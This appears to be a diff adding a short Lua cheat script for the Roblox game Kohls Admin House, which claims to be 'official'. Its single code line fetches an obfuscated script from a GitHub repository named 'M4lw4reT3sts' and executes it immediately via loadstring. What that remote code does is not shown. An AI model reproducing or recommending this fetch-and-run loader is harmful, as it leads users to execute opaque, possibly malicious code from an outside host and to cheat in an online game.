@@ -1,0 +1,3 @@
+--Official script. Only for Kohls Admin House NBC/BC. It doesn't work on the remakes or the ripoff games. Just saying
+
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats-2/main/Obfuscated%20SCV2-NP%20release.txt'),true))()
